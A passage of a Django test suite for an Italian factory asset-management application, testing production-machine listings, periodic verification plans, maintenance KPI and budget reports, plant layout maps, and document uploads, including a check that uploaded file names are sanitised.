        shell_response = self.client.get(reverse("assets:asset_dashboard"))
        self.assertEqual(shell_response.status_code, 200)
        self.assertContains(shell_response, 'data-as-nav-group data-as-nav-key', html=False)
        self.assertContains(shell_response, 'class="as-nav-children"', html=False)
        self.assertContains(shell_response, "localStorage.removeItem(storageKey)", html=False)
        self.assertContains(shell_response, "closeOtherGroups", html=False)
        self.assertNotContains(shell_response, "localStorage.setItem(storageKey", html=False)

    def test_work_machine_list_redirects_to_production_group(self):
        # La pagina dedicata "Asset produzione" e' confluita nell'inventario
        # unico: la vecchia rotta reindirizza a asset_list?group=production
        # preservando la ricerca.
        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:work_machine_list"), {"q": "Tornio"})
        self.assertEqual(response.status_code, 302)
        target = reverse("assets:asset_list")
        self.assertTrue(response["Location"].startswith(target))
        self.assertIn("group=production", response["Location"])
        self.assertIn("q=Tornio", response["Location"])

    def test_work_machine_list_shows_machine_after_redirect(self):
        asset = Asset.objects.create(
            name="Tornio parallelo",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="OFF",
            source_key="manual-wm-test-list",
        )
        WorkMachine.objects.create(asset=asset, source_key="manual-wm-test-list", year=2021, cnc_controlled=True)
        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:work_machine_list"), follow=True)
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Asset produzione")
        self.assertContains(response, "Tornio parallelo")

    def test_asset_list_production_group_excludes_it_assets(self):
        machine = Asset.objects.create(
            name="Fresa CNC produzione",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="OFF",
            source_key="manual-prod-machine",
        )
        WorkMachine.objects.create(asset=machine, source_key="manual-prod-machine", year=2021)
        Asset.objects.create(
            asset_tag="IT-PC-PROD",
            name="PC ufficio produzione",
            asset_type=Asset.TYPE_PC,
            reparto="OFF",
            source_key="manual-prod-pc",
        )
        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:asset_list"), {"group": "production"})
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Fresa CNC produzione")
        self.assertNotContains(response, "PC ufficio produzione")

    def test_asset_list_production_group_search_matches_internal_number(self):
        match = Asset.objects.create(
            name="Tornio con N.INT",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="OFF",
            internal_number="INT-9001",
            source_key="manual-wm-search-int-match",
        )
        WorkMachine.objects.create(asset=match, source_key="manual-wm-search-int-match", year=2020)
        other = Asset.objects.create(
            name="Fresa senza match",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="OFF",
            internal_number="INT-7777",
            source_key="manual-wm-search-int-other",
        )
        WorkMachine.objects.create(asset=other, source_key="manual-wm-search-int-other", year=2020)

        self.client.force_login(self.user)
        response = self.client.get(
            reverse("assets:asset_list"), {"group": "production", "q": "INT-9001"}
        )

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Tornio con N.INT")
        self.assertNotContains(response, "Fresa senza match")

    def test_asset_list_production_group_cnc_filter(self):
        cnc = Asset.objects.create(
            name="Centro CNC",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="OFF",
            source_key="manual-cnc-yes",
        )
        WorkMachine.objects.create(asset=cnc, source_key="manual-cnc-yes", year=2021, cnc_controlled=True)
        manual = Asset.objects.create(
            name="Tornio manuale",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="OFF",
            source_key="manual-cnc-no",
        )
        WorkMachine.objects.create(asset=manual, source_key="manual-cnc-no", year=2021, cnc_controlled=False)
        self.client.force_login(self.user)
        response = self.client.get(
            reverse("assets:asset_list"), {"group": "production", "cnc_only": "on"}
        )
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Centro CNC")
        self.assertNotContains(response, "Tornio manuale")

    def test_asset_list_production_group_search_spans_all_assets(self):
        # Con una ricerca attiva il gruppo produzione NON deve confinare i
        # risultati: un asset registrato con tipo generico (non di produzione)
        # deve comunque essere trovato cercando per N. interno.
        Asset.objects.create(
            asset_tag="GEN-188",
            name="Macchina registrata come Altro",
            asset_type=Asset.TYPE_OTHER,
            reparto="OFF",
            internal_number="188",
            source_key="manual-generic-188",
        )
        self.client.force_login(self.user)
        # Senza ricerca: la vista di navigazione mostra solo i tipi di produzione.
        landing = self.client.get(reverse("assets:asset_list"), {"group": "production"})
        self.assertNotContains(landing, "Macchina registrata come Altro")
        # Con ricerca: spazia su tutto e trova anche l'asset non di produzione.
        found = self.client.get(
            reverse("assets:asset_list"), {"group": "production", "q": "188"}
        )
        self.assertEqual(found.status_code, 200)
        self.assertContains(found, "Macchina registrata come Altro")

    def test_device_list_uses_common_asset_table_columns(self):
        Asset.objects.create(
            asset_tag="IT-PC-001",
            name="Notebook amministrazione",
            asset_type=Asset.TYPE_PC,
            reparto="CED",
            assignment_to="Mario Rossi",
            assignment_location="Ufficio IT",
            manufacturer="Lenovo",
            model="T14",
            serial_number="SN-PC-001",
        )
        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:device_list"))
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, 'class="dv-table"', html=False)
        self.assertContains(response, "Responsabile")
        self.assertContains(response, "Collocazione")
        self.assertContains(response, "Notebook amministrazione")
        self.assertContains(response, "SN-PC-001")

    def test_work_machine_dashboard_200_when_logged(self):
        asset = Asset.objects.create(
            name="Centro di lavoro officina",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CN5",
            source_key="manual-wm-dashboard",
        )
        WorkMachine.objects.create(
            asset=asset,
            source_key="manual-wm-dashboard",
            year=2020,
            cnc_controlled=True,
            next_maintenance_date=date(2026, 3, 20),
        )
        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:work_machine_dashboard"))
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Dashboard officina")
        self.assertContains(response, "Centro di lavoro officina")
        self.assertContains(response, 'type="month"', html=False)
        self.assertContains(response, f'value="{timezone.localdate().strftime("%Y-%m")}"', html=False)

    def test_reports_dashboard_contains_month_selector(self):
        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:reports") + "?scope=production")
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, 'type="month"', html=False)
        self.assertContains(response, f'value="{timezone.localdate().strftime("%Y-%m")}"', html=False)

    def test_reports_dashboard_shows_pm_compliance_and_budget_vs_actual(self):
        today = timezone.localdate()
        category = AssetCategory.objects.create(
            code="cnc-report-kpi",
            label="CNC report KPI",
            base_asset_type=Asset.TYPE_CNC,
            is_active=True,
        )
        template = MaintenanceInterventionTemplate.objects.create(
            code="pm-report-kpi",
            label="Tagliando report KPI",
            asset_category=category,
        )
        rule = MaintenanceRule.objects.create(
            intervention_template=template,
            asset_category=category,
            threshold_type=MaintenanceRule.THRESHOLD_DAYS,
            threshold_value=30,
            warning_days=5,
        )
        asset_ok = Asset.objects.create(
            asset_tag="CNC-RPT-OK",
            name="Centro report in linea",
            asset_type=Asset.TYPE_CNC,
            asset_category=category,
            status=Asset.STATUS_IN_USE,
        )
        asset_overdue = Asset.objects.create(
            asset_tag="CNC-RPT-KO",
            name="Centro report scaduto",
            asset_type=Asset.TYPE_CNC,
            asset_category=category,
            status=Asset.STATUS_IN_USE,
        )
        AssetMaintenanceRuleState.objects.create(
            asset=asset_ok,
            base_rule=rule,
            last_execution_date=today - timedelta(days=10),
        )
        AssetMaintenanceRuleState.objects.create(
            asset=asset_overdue,
            base_rule=rule,
            last_execution_date=today - timedelta(days=45),
        )
        AssetMaintenanceBudget.objects.create(
            asset_category=category,
            year=today.year,
            budget_eur=Decimal("1000.00"),
        )
        WorkOrder.objects.create(
            asset=asset_ok,
            maintenance_rule=rule,
            origin=WorkOrder.ORIGIN_PERIODIC,
            kind=WorkOrder.KIND_PREVENTIVE,
            status=WorkOrder.STATUS_DONE,
            title="Tagliando report KPI chiuso",
            closed_at=timezone.now(),
            cost_eur=Decimal("250.00"),
        )

        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:reports") + "?scope=production")

        self.assertEqual(response.status_code, 200)
        self.assertEqual(response.context["pm_kpi"]["compliance_pct"], 50.0)
        self.assertEqual(response.context["budget_kpi"]["budget_total"], Decimal("1000.00"))
        self.assertEqual(response.context["budget_kpi"]["actual_total"], Decimal("250.00"))
        self.assertContains(response, "PM compliance")
        self.assertContains(response, "Budget vs actual per categoria")
        self.assertContains(response, "CNC report KPI")
        self.assertContains(response, "EUR")
        self.assertContains(
            response,
            f'href="{reverse("assets:maintenance_schedule")}?status=due"',
            html=False,
        )
        self.assertContains(response, "OdL categoria")
        self.assertEqual(
            response.context["budget_rows"][0]["workorders_url"],
            f'{reverse("assets:wo_list")}?status={WorkOrder.STATUS_DONE}&category={category.id}',
        )

    def test_admin_can_create_periodic_verification_with_supplier_and_assets(self):
        admin = User.objects.create_superuser(
            username="asset-periodic-admin",
            email="asset-periodic-admin@test.local",
            password="pass12345",
        )
        supplier = Fornitore.objects.create(ragione_sociale="Verifiche Industriali Srl", categoria=Fornitore.CATEGORIA_MANUTENZIONE)
        asset = Asset.objects.create(
            name="Carroponte 5T",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="OFF",
            source_key="manual-periodic-carroponte",
        )

        self.client.force_login(admin)
        response = self.client.post(
            reverse("assets:periodic_verifications"),
            {
                "action": "create_periodic_verification",
                "name": "Verifica carroponte",
                "supplier": str(supplier.id),
                "frequency_months": "3",
                "last_verification_date": timezone.localdate().strftime("%Y-%m-%d"),
                "next_verification_date": "",
                "asset_ids": [str(asset.id)],
                "is_active": "on",
                "notes": "Controllo trimestrale gru a ponte",
            },
        )

        self.assertEqual(response.status_code, 302)
        verification = PeriodicVerification.objects.get(name="Verifica carroponte")
        self.assertEqual(verification.supplier, supplier)
        self.assertTrue(verification.assets.filter(pk=asset.id).exists())
        self.assertEqual(verification.frequency_months, 3)
        self.assertIsNotNone(verification.next_verification_date)

    def test_periodic_verification_page_prioritizes_list_and_opens_form_on_request(self):
        admin = User.objects.create_superuser(
            username="asset-periodic-layout-admin",
            email="asset-periodic-layout-admin@test.local",
            password="pass12345",
        )
        Asset.objects.create(
            name="Carroponte reparto A",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="OFF",
            source_key="manual-periodic-layout-page",
        )

        self.client.force_login(admin)
        response = self.client.get(reverse("assets:periodic_verifications") + "?scope=production")

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Attive")
        self.assertContains(response, "Da gestire")
        self.assertContains(response, "Pianificate")
        self.assertContains(response, "Archivio / regole")
        self.assertContains(response, "+ Nuovo piano")
        self.assertNotContains(response, "Cerca asset coinvolti per tag o nome")
        self.assertNotContains(response, "Compatta")
        self.assertNotContains(response, "Bilanciata")
        self.assertNotContains(response, "Ampia")

        create_response = self.client.get(
            reverse("assets:periodic_verifications") + "?scope=production&create=1"
        )
        self.assertContains(create_response, "Cerca asset coinvolti per tag o nome")
        self.assertContains(create_response, "Seleziona visibili")

    def test_periodic_verification_operational_views_and_asset_context(self):
        admin = User.objects.create_superuser(
            username="asset-periodic-queue-admin",
            email="asset-periodic-queue@test.local",
            password="pass12345",
        )
        asset = Asset.objects.create(
            asset_tag="PV-QUEUE-01",
            name="Centro periodico principale",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="OFF",
            source_key="periodic-queue-main",
        )
        other_asset = Asset.objects.create(
            asset_tag="PV-QUEUE-02",
            name="Centro periodico secondario",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="MAN",
            source_key="periodic-queue-other",
        )
        supplier = Fornitore.objects.create(
            ragione_sociale="Service Periodico Queue",
            categoria=Fornitore.CATEGORIA_MANUTENZIONE,
        )
        due = PeriodicVerification.objects.create(
            name="Lubrificazione scaduta",
            supplier=supplier,
            frequency_months=3,
            next_verification_date=timezone.localdate() - timedelta(days=2),
            is_active=True,
        )
        planned = PeriodicVerification.objects.create(
            name="Controllo pianificato",
            frequency_months=6,
            next_verification_date=timezone.localdate() + timedelta(days=60),
            is_active=True,
        )
        legacy = PeriodicVerification.objects.create(
            name="Piano gestito da regola",
            frequency_months=12,
            is_active=True,
            is_legacy=True,
        )
        inactive = PeriodicVerification.objects.create(
            name="Piano disattivato",
            frequency_months=12,
            is_active=False,
        )
        unrelated = PeriodicVerification.objects.create(
            name="Piano altro asset",
            frequency_months=4,
            next_verification_date=timezone.localdate() + timedelta(days=45),
            is_active=True,
        )
        for verification in (due, planned, legacy, inactive):
            verification.assets.add(asset)
        unrelated.assets.add(other_asset)
        self.client.force_login(admin)
        base_url = reverse("assets:periodic_verifications")

        active_response = self.client.get(base_url, {"scope": "production"})
        self.assertEqual(active_response.context["periodic_view"], "active")
        self.assertContains(active_response, due.name)
        self.assertContains(active_response, planned.name)
        self.assertNotContains(active_response, legacy.name)
        self.assertNotContains(active_response, inactive.name)
        self.assertContains(active_response, "Registra esecuzione")
        self.assertContains(active_response, "Dettagli e storico")

        attention_response = self.client.get(base_url, {"scope": "production", "view": "attention"})
        self.assertContains(attention_response, due.name)
        self.assertNotContains(attention_response, planned.name)

        archive_response = self.client.get(base_url, {"scope": "production", "view": "archive"})
        self.assertContains(archive_response, legacy.name)
        self.assertContains(archive_response, inactive.name)
        self.assertNotContains(archive_response, 'data-pv-record-toggle="', html=False)

        asset_response = self.client.get(
            base_url,
            {"scope": "production", "asset": str(asset.id), "q": "Service Periodico"},
        )
        self.assertContains(asset_response, due.name)
        self.assertNotContains(asset_response, planned.name)
        self.assertNotContains(asset_response, unrelated.name)

    def test_legacy_periodic_verification_url_redirects_to_maintenance_route(self):
        admin = User.objects.create_superuser(
            username="asset-periodic-legacy-admin",
            email="asset-periodic-legacy-admin@test.local",
            password="pass12345",
        )
        self.client.force_login(admin)
        response = self.client.get("/assets/verifiche-periodiche/")
        self.assertRedirects(
            response,
            reverse("assets:periodic_verifications"),
            fetch_redirect_response=False,
        )

    def test_asset_edit_can_assign_multiple_periodic_verifications(self):
        asset = Asset.objects.create(
            name="Pressa assemblaggio",
            asset_type=Asset.TYPE_HW,
            reparto="ASS",
            status=Asset.STATUS_IN_USE,
            source_key="manual-periodic-asset-edit",
        )
        verification_a = PeriodicVerification.objects.create(name="Verifica elettrica", frequency_months=12)
        verification_b = PeriodicVerification.objects.create(name="Verifica sicurezza", frequency_months=6)

        self.client.force_login(self.user)
        response = self.client.post(
            reverse("assets:asset_edit", kwargs={"id": asset.id}),
            {
                "asset_tag": asset.asset_tag,
                "name": asset.name,
                "asset_type": asset.asset_type,
                "reparto": asset.reparto,
                "manufacturer": "",
                "model": "",
                "serial_number": "",
                "status": asset.status,
                "assignment_to": "",
                "assignment_reparto": "",
                "assignment_location": "",
                "notes": "",
                "periodic_verification_ids": [str(verification_a.id), str(verification_b.id)],
            },
        )

        self.assertEqual(response.status_code, 302)
        asset.refresh_from_db()
        self.assertEqual(asset.periodic_verifications.count(), 2)
        detail_response = self.client.get(reverse("assets:asset_view", kwargs={"id": asset.id}))
        self.assertContains(detail_response, "Verifica elettrica")
        self.assertContains(detail_response, "Verifica sicurezza")

    def test_work_machine_maintenance_month_dataset_filters_month_and_reparto(self):
        today = timezone.localdate()
        month_start = today.replace(day=1)
        next_month_start = (month_start + timedelta(days=32)).replace(day=1)

        asset_due = Asset.objects.create(
            name="Centro filtro reparto",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CN5",
            source_key="manual-wm-month-report-cn5",
        )
        WorkMachine.objects.create(
            asset=asset_due,
            source_key="manual-wm-month-report-cn5",
            next_maintenance_date=month_start + timedelta(days=4),
            maintenance_reminder_days=15,
        )

        asset_other_reparto = Asset.objects.create(
            name="Centro altro reparto",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="TNC",
            source_key="manual-wm-month-report-tnc",
        )
        WorkMachine.objects.create(
            asset=asset_other_reparto,
            source_key="manual-wm-month-report-tnc",
            next_maintenance_date=month_start + timedelta(days=8),
            maintenance_reminder_days=15,
        )

        asset_other_month = Asset.objects.create(
            name="Centro mese successivo",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CN5",
            source_key="manual-wm-month-report-next",
        )
        WorkMachine.objects.create(
            asset=asset_other_month,
            source_key="manual-wm-month-report-next",
            next_maintenance_date=next_month_start + timedelta(days=3),
            maintenance_reminder_days=15,
        )

        dataset = asset_views._build_work_machine_maintenance_month_dataset(
            month_value=month_start.strftime("%Y-%m"),
            reparto_filter="CN5",
            today=today,
        )

        self.assertEqual(dataset["total_count"], 1)
        self.assertEqual(len(dataset["rows"]), 1)
        self.assertEqual(dataset["rows"][0]["asset"].name, "Centro filtro reparto")
        self.assertEqual(dataset["rows"][0]["asset"].reparto, "CN5")
        self.assertEqual(dataset["month_code"], month_start.strftime("%Y-%m"))

    def test_work_machine_maintenance_month_pdf_returns_pdf(self):
        today = timezone.localdate()
        month_start = today.replace(day=1)
        asset = Asset.objects.create(
            name="Centro PDF manutenzione",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CN5",
            source_key="manual-wm-month-report-pdf",
        )
        WorkMachine.objects.create(
            asset=asset,
            source_key="manual-wm-month-report-pdf",
            next_maintenance_date=month_start + timedelta(days=6),
            maintenance_reminder_days=10,
        )

        self.client.force_login(self.user)
        response = self.client.get(
            reverse("assets:work_machine_maintenance_month_pdf"),
            {"month": month_start.strftime("%Y-%m"), "reparto": "CN5"},
        )

        self.assertEqual(response.status_code, 200)
        self.assertTrue(response["Content-Type"].startswith("application/pdf"))
        self.assertIn(".pdf", response["Content-Disposition"])
        self.assertIn(month_start.strftime("%Y-%m"), response["Content-Disposition"])
        self.assertTrue(response.content.startswith(b"%PDF"))
        self.assertGreater(len(response.content), 800)

    def test_plant_layout_map_renders_active_layout(self):
        asset = Asset.objects.create(
            name="Centro mappa",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CN5",
            source_key="manual-wm-layout-map",
        )
        WorkMachine.objects.create(asset=asset, source_key="manual-wm-layout-map", cnc_controlled=True)
        layout = PlantLayout.objects.create(
            category="Officina",
            name="Officina principale",
            description="Versione marzo",
            image=_valid_png_upload(),
            is_active=True,
        )
        PlantLayoutArea.objects.create(
            layout=layout,
            name="Reparto CN5",
            reparto_code="CN5",
            color="#2563EB",
            x_percent=5,
            y_percent=10,
            width_percent=30,
            height_percent=22,
        )
        PlantLayoutMarker.objects.create(
            layout=layout,
            asset=asset,
            label="ML-001",
            x_percent=16,
            y_percent=21,
        )

        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:plant_layout_map"))

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "Officina principale")
        self.assertContains(response, "Reparto CN5")
        self.assertContains(response, "Centro mappa")

    def test_plant_layout_map_can_switch_active_category(self):
        PlantLayout.objects.create(
            category="Officina",
            name="Officina principale",
            description="Layout reparto produttivo",
            image=_valid_png_upload("officina.png"),
            is_active=True,
        )
        PlantLayout.objects.create(
            category="TVCC",
            name="TVCC capannone",
            description="Layout telecamere",
            image=_valid_png_upload("tvcc.png"),
            is_active=True,
        )

        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:plant_layout_map"), {"category": "TVCC"})

        self.assertEqual(response.status_code, 200)
        self.assertContains(response, "TVCC capannone")
        self.assertContains(response, "TVCC")
        self.assertNotContains(response, "Officina principale")

    def test_plant_layout_editor_is_governed_by_acl_not_admin_only(self):
        # Regressione: l'editor non deve piu' essere hard-gated con
        # @legacy_admin_required. La view e' protetta da @login_required e
        # l'autorizzazione fine passa dal binding canonico ACL v2
        # (assets:plant_layout_editor -> assets.wm_map.edit). La logica
        # allow/deny del resolver e' coperta da core.test_acl_v2; qui basta
        # verificare che un utente loggato non venga piu' bloccato dal solo
        # decoratore admin-only della view.
        self.client.force_login(self.user)
        response = self.client.get(reverse("assets:plant_layout_editor"))
        self.assertEqual(response.status_code, 200)

    def test_admin_can_save_plant_layout_with_areas_and_markers(self):
        admin = User.objects.create_superuser(
            username="asset-layout-admin",
            email="asset-layout-admin@test.local",
            password="pass12345",
        )
        asset = Asset.objects.create(
            name="Centro da posizionare",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CN5",
            source_key="manual-wm-layout-editor",
        )
        WorkMachine.objects.create(asset=asset, source_key="manual-wm-layout-editor", cnc_controlled=True)

        self.client.force_login(admin)
        with _workspace_temporary_directory("assets-layout-") as tmpdir:
            with override_settings(MEDIA_ROOT=Path(tmpdir)):
                with patch("admin_portale.decorators.get_legacy_user", return_value=SimpleNamespace(id=1, ruolo_id=1)):
                    with patch("admin_portale.decorators.is_legacy_admin", return_value=True):
                        response = self.client.post(
                            reverse("assets:plant_layout_editor"),
                            {
                                "action": "save_layout",
                                "layout_mode": "new",
                                "category": "TVCC",
                                "name": "Layout officina CN5",
                                "description": "Prima planimetria",
                                "is_active": "on",
                                "areas_payload": json.dumps(
                                    [
                                        {
                                            "name": "CN5",
                                            "reparto_code": "CN5",
                                            "color": "#2563EB",
                                            "notes": "Isola 1",
                                            "x_percent": 10,
                                            "y_percent": 8,
                                            "width_percent": 35,
                                            "height_percent": 24,
                                            "sort_order": 10,
                                        }
                                    ]
                                ),
                                "markers_payload": json.dumps(
                                    [
                                        {
                                            "asset_id": asset.id,
                                            "label": "ML-CN5",
                                            "x_percent": 18,
                                            "y_percent": 17,
                                            "sort_order": 10,
                                        }
                                    ]
                                ),
                                "image": _valid_png_upload(),
                            },
                        )

        self.assertEqual(response.status_code, 302)
        layout = PlantLayout.objects.get(name="Layout officina CN5")
        self.assertEqual(layout.category, "TVCC")
        self.assertTrue(layout.is_active)
        area = PlantLayoutArea.objects.get(layout=layout)
        marker = PlantLayoutMarker.objects.get(layout=layout, asset=asset)
        self.assertEqual(area.reparto_code, "CN5")
        self.assertEqual(marker.label, "ML-CN5")

    def test_save_layout_marker_for_existing_asset_does_not_violate_unique(self):
        # Regressione (prod IntegrityError uniq_plant_layout_marker_layout_asset):
        # ri-salvando un layout con una riga marker NUOVA (senza id) per un asset
        # che ha gia' un marker non deve generare un INSERT duplicato (layout, asset).
        from assets.forms import PlantLayoutForm

        self._dedup_tmpdir = _make_workspace_tempdir("assets-dedup-")
        self.addCleanup(shutil.rmtree, self._dedup_tmpdir, ignore_errors=True)
        media_override = override_settings(MEDIA_ROOT=Path(self._dedup_tmpdir))
        media_override.enable()
        self.addCleanup(media_override.disable)

        layout = PlantLayout.objects.create(
            category="Officina", name="Layout dedup", image=_valid_png_upload("dedup.png"), is_active=True
        )
        asset = Asset.objects.create(
            name="Macchina gia' posizionata",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CN5",
            source_key="manual-wm-dedup",
        )
        existing = PlantLayoutMarker.objects.create(
            layout=layout, asset=asset, label="vecchio", x_percent=10, y_percent=10
        )

        form = PlantLayoutForm(
            data={
                "category": layout.category,
                "name": layout.name,
                "description": "",
                "is_active": "on",
                "areas_payload": json.dumps([]),
                # nessun "id": simula la riga nuova inviata dal frontend per lo
                # stesso asset gia' presente sul layout.
                "markers_payload": json.dumps(
                    [{"asset_id": asset.id, "label": "nuovo", "x_percent": 40, "y_percent": 55, "sort_order": 10}]
                ),
            },
            instance=layout,
        )
        self.assertTrue(form.is_valid(), form.errors)
        form.save()

        markers = PlantLayoutMarker.objects.filter(layout=layout, asset=asset)
        self.assertEqual(markers.count(), 1)
        marker = markers.get()
        self.assertEqual(marker.label, "nuovo")
        self.assertEqual(marker.id, existing.id)

    def test_work_machine_create_form_creates_asset_and_profile(self):
        self.client.force_login(self.user)
        with _workspace_temporary_directory("assets-work-machine-form-") as tmpdir:
            manual_file = SimpleUploadedFile("manuale.pdf", b"%PDF-1.4 test", content_type="application/pdf")
            with override_settings(MEDIA_ROOT=Path(tmpdir)):
                with patch("assets.views.validate_extension_and_mime", return_value="application/pdf"):
                    response = self.client.post(
                        reverse("assets:work_machine_create"),
                        {
                            "name": "Centro di lavoro 5 assi",
                            "reparto": "CN5",
                            "manufacturer": "DMG Mori",
                            "model": "DMC 85",
                            "serial_number": "DMG-550",
                            "status": Asset.STATUS_IN_USE,
                            "assignment_to": "Officina",
                            "assignment_reparto": "CN5",
                            "assignment_location": "Corsia A",
                            "notes": "Inserimento manuale",
                            "x_mm": "850",
                            "y_mm": "700",
                            "z_mm": "500",
                            "diameter_mm": "120",
                            "spindle_mm": "180",
                            "year": "2022",
                            "tmc": "48",
                            "tcr_enabled": "on",
                            "pressure_bar": "6.5",
                            "cnc_controlled": "on",
                            "five_axes": "on",
                            "accuracy_from": "0.010",
                            "next_maintenance_date": "2026-03-30",
                            "maintenance_reminder_days": "15",
                            "documents_specs_payload": json.dumps(
                                [{"name": "Scheda tecnica", "url": "/docs/spec.pdf", "date": "06/03/2026", "size": "PDF"}]
                            ),
                            "documents_manuals_payload": json.dumps(
                                [{"name": "Manuale operatore", "url": "/docs/manuale.pdf", "date": "06/03/2026", "size": "v1"}]
                            ),
                            "documents_interventions_payload": json.dumps([]),
                            "upload_manuals_files": manual_file,
                        },
                    )
                self.assertEqual(response.status_code, 302)
                asset = Asset.objects.get(name="Centro di lavoro 5 assi")
                self.assertEqual(asset.asset_type, Asset.TYPE_WORK_MACHINE)
                machine = WorkMachine.objects.get(asset=asset)
                self.assertEqual(machine.x_mm, 850)
                self.assertEqual(machine.tmc, 48)
                self.assertTrue(machine.tcr_enabled)
                self.assertTrue(machine.cnc_controlled)
                self.assertTrue(machine.five_axes)
                self.assertEqual(str(machine.next_maintenance_date), "2026-03-30")
                self.assertEqual(machine.maintenance_reminder_days, 15)
                documents = asset.extra_columns.get("documents", [])
                self.assertEqual(len(documents), 2)
                self.assertEqual({row["category"] for row in documents}, {"SPECIFICHE", "MANUALI"})
                upload = AssetDocument.objects.get(asset=asset, category=AssetDocument.CATEGORY_MANUALI)
                self.assertEqual(upload.original_name, "manuale.pdf")
                self.assertTrue(Path(upload.file.path).exists())

    def test_work_machine_upload_sanitizes_name_and_uses_authenticated_download(self):
        self.client.force_login(self.user)
        with _workspace_temporary_directory("assets-work-machine-upload-") as tmpdir:
            manual_file = SimpleUploadedFile("../manuale rischio.pdf", b"%PDF-1.4 test", content_type="application/pdf")
            with override_settings(MEDIA_ROOT=Path(tmpdir)):
                with patch("assets.views.validate_extension_and_mime", return_value="application/pdf"):
                    response = self.client.post(
                        reverse("assets:work_machine_create"),
                        {
                            "name": "Centro upload locale",
                            "reparto": "CN5",
                            "status": Asset.STATUS_IN_USE,
                            "documents_specs_payload": json.dumps([]),
                            "documents_manuals_payload": json.dumps([]),
                            "documents_interventions_payload": json.dumps([]),
                            "upload_manuals_files": manual_file,
                        },
                    )
                self.assertEqual(response.status_code, 302)
                asset = Asset.objects.get(name="Centro upload locale")
                upload = AssetDocument.objects.get(asset=asset, category=AssetDocument.CATEGORY_MANUALI)
                self.assertEqual(upload.original_name, "manuale rischio.pdf")
                self.assertNotIn("..", upload.file.name)
                self.assertNotIn("\\", upload.file.name)

                edit_page = self.client.get(reverse("assets:work_machine_edit", args=[asset.id]))
                self.assertContains(edit_page, reverse("assets:asset_document_download", args=[upload.id]))
                self.assertNotContains(edit_page, "/media/assets_documents/")

                download = self.client.get(reverse("assets:asset_document_download", args=[upload.id]))
                self.assertEqual(download.status_code, 200)
                self.assertEqual(download["Content-Type"], "application/pdf")
                self.assertEqual(b"".join(download.streaming_content), b"%PDF-1.4 test")

    def test_asset_detail_upload_saves_into_local_archive(self):
        self.client.force_login(self.user)
        asset = Asset.objects.create(
            name="Centro upload dettaglio",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CN5",
            status=Asset.STATUS_IN_USE,
        )
        WorkMachine.objects.create(asset=asset, source_key="detail-local-upload")
        with _workspace_temporary_directory("assets-detail-upload-") as tmpdir:
            specs_file = SimpleUploadedFile("specifica.pdf", b"%PDF-1.4 test", content_type="application/pdf")
            with override_settings(MEDIA_ROOT=Path(tmpdir)):
                with patch("assets.views.validate_extension_and_mime", return_value="application/pdf"):
                    response = self.client.post(
                        reverse("assets:asset_view", args=[asset.id]),
                        {
                            "action": "upload_asset_documents",
                            "upload_specs_files": specs_file,
                        },
                    )
        self.assertEqual(response.status_code, 302)
        document = AssetDocument.objects.get(asset=asset, category=AssetDocument.CATEGORY_SPECIFICHE)
        self.assertEqual(document.original_name, "specifica.pdf")
        self.assertTrue(document.file)

    def test_asset_detail_folder_upload_keeps_relative_path(self):
        self.client.force_login(self.user)
        asset = Asset.objects.create(
            name="Centro upload cartella",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CN5",
            status=Asset.STATUS_IN_USE,
        )
        WorkMachine.objects.create(asset=asset, source_key="detail-folder-upload")
        with _workspace_temporary_directory("assets-detail-folder-upload-") as tmpdir:
            specs_file = SimpleUploadedFile("specifica.pdf", b"%PDF-1.4 test", content_type="application/pdf")
            with override_settings(MEDIA_ROOT=Path(tmpdir)):
                with patch("assets.views.validate_extension_and_mime", return_value="application/pdf"):
                    response = self.client.post(
                        reverse("assets:asset_view", args=[asset.id]),
                        {
                            "action": "upload_asset_documents",
                            "upload_specs_files": specs_file,
                            "upload_specs_files_relative_path": "Cartella originale/Sub cartella/specifica.pdf",
                        },
                    )

        self.assertEqual(response.status_code, 302)
        document = AssetDocument.objects.get(asset=asset, category=AssetDocument.CATEGORY_SPECIFICHE)
        self.assertEqual(document.original_name, "specifica.pdf")
        # La cartella relativa viene persistita sul documento per la vista raggruppata.
        self.assertEqual(document.relative_folder, "Cartella originale/Sub cartella")

    def test_documents_by_category_groups_uploads_by_folder(self):
        """La scheda asset raggruppa i documenti per cartella di origine."""
        asset = Asset.objects.create(
            name="Centro raggruppamento",
            asset_type=Asset.TYPE_WORK_MACHINE,
            reparto="CN5",
            source_key="manual-wm-grouping",
        )
